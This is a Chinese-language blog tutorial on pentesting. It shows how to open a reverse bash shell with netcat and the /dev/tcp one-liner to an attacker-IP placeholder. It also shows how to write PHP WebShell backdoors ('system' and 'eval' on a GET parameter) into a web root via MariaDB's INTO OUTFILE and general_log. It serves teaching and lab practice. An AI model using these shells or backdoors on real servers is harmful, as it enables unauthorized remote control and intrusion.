---
title: 获取 WebShell 和反弹 Bash
date: 2021-04-28 22:23:26
updated:
category: [网络安全]
tags: [nc, 渗透, Bash]
mermaid:
index_img: ../img/cover_reverse_shell.jpg
---

旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。

<!--more -->

## 反弹 BASH

与 SSH 的区别在于，可以让目标主机主动连接黑客的主机，从而绕过防火墙的限制。

### 实现方式

最常用的反弹 Bash 方式是利用 nc（netcat）工具，黑客在自己电脑上监听端口

```bash
nc -lvnp < 端口 >
```

- `-l`: 监听模式。
- `-v`: 显示详细的信息。
- `-n`: 不进行域名解析。
- `-p < 端口 >`: 监听的端口号。

在目标主机执行

```shell
bash -i >& /dev/tcp/< 攻击者 IP>/< 端口 > 0>&1
```

- `-i`: 交互式 shell

- `&>`: 将标准输出和错误进行重定向

- `/dev/tcp/ip/port`: bash 建立 socket 的一种特殊写法，除此之外还有 udp

- `<&1`: 把标准输入重定向到标准输出，其他写法 `0>&1`


{% note primary %}
什么？你要问我都能连接到靶机执行指令了还要什么 nc？哼哼，黑客通常是使用各种漏洞连接到靶机，使用 nc 只是为了更方便的执行系统指令。

比如利用数据库漏洞执行 nc 反弹 bash

```shell
system bash -c 'bash -i &> /dev/tcp/{外部机器 IP}/{端口} <&1'
```
{% endnote %}

## Web Shell

利用 Web 服务器漏洞执行 shell 指令，下面演示利用 PHP + MariaDB 写入一个后门文件。

### 利用 secure_file_priv

主要用于限制数据库对文件系统的访问。它规定 MySQL 服务器可以进行文件导入导出操作的目录。

```sql
MariaDB root@(none):(none)> show variables like '% secure%'
| Variable_name            | Value   |
|--------------------------|---------|
| require_secure_transport | OFF     |
| secure_auth              | ON      |
| secure_file_priv         |         |
| secure_timestamp         | NO      |
```

- 空字符串（''）： 不限制导入导出目录，MySQL 可以在任意目录进行文件操作。
- 指定目录： 只能在指定的目录进行导入导出操作。例如：secure_file_priv='/var/lib/mysql'
- NULL： 禁止所有的文件导入导出操作，包括 LOAD DATA INFILE、SELECT ... INTO OUTFILE 和 LOAD_FILE () 函数。

然后查看用户是否具有 IO 权限

```sql
select group_concat (user,0x3a,file_priv) from mysql.user;
```

执行代码将后门输出到服务器

```sql
select "<?php @system ($_GET ['cmd']);?>" into outfile '/srv/http/houmen.php';
```

接下来就可以利用这个文件为所欲为啦

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/../img/article/2021/webshell.jpg)

### 利用 general_log

如果上面的 `secure_file_priv` 规定了输出目录或者是 NULL，还可以使用 `general_log` 的方法来写 shell，它记录所有基础日志，默认关闭状态。

1. 模糊查找关于 general 的信息

```sql
MariaDB root@(none):(none)> show variables like '% general%'
| Variable_name    | Value            |
|------------------|------------------|
| general_log      | OFF              |
| general_log_file |                  |
```

2. 开启 general_log，设置路径

```sql
MariaDB root@(none):(none)> set global general_log = 1;
MariaDB root@(none):(none)> set global general_log_file = '/srv/http/hm.php';
MariaDB root@(none):(none)> show variables like '% general%'
| Variable_name    | Value            |
|------------------|------------------|
| general_log      | ON               |
| general_log_file | /srv/http/hm.php |
```

3. 写入数据

```sql
MariaDB root@(none):(none)> select "<?php @eval ($_GET ['command']);?>"
```

```php
> sudo cat /srv/http/hm.php
/usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:
Tcp port: 3306  Unix socket: /run/mysqld/mysqld.sock
Time                Id Command  Argument
210429 17:29:36      3 Query    select "<?php @system ($_GET ['cmd']);?>"
```

{% note danger %}
如果数据库用户权限被严格管控了 IO，那么将无法实现上述步骤，比如在 Linux 里面，httpd 的用户是 http，mariadb 的用户是 mysql，默认情况下，mysql 无法写入，httpd 无法读取
{% endnote %}

## 总结

后端只要满足三个条件就可以反弹 shell

- 支持 tcp 链接
- 支持 IO 重定向
- 可以调用系统命令

## 参考

- [常见数据库写入 Webshell 汇总](https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment)
- [bash -i >& /dev/tcp/localhost/8080 0>&1 的含义](https://becivells.github.io/2019/01/bash_i_dev_tcp/)